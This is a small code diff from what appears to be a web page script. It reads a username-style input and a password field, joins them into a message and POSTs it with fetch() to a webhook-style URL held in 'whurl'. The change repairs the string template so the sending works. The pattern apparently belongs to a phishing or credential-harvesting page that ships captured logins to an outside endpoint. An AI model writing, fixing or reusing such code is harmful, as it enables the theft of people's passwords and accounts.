@@ -52,12 +52,7 @@
     var pass = document.getElementById("password").value;
 
     const msg = {
-        "content": $ {
-            theInput
-        }
-        $ {
-            pass
-        }
+        "content": `${theInput}  ${pass}`
     }
     fetch(whurl, {
         "method": "POST",
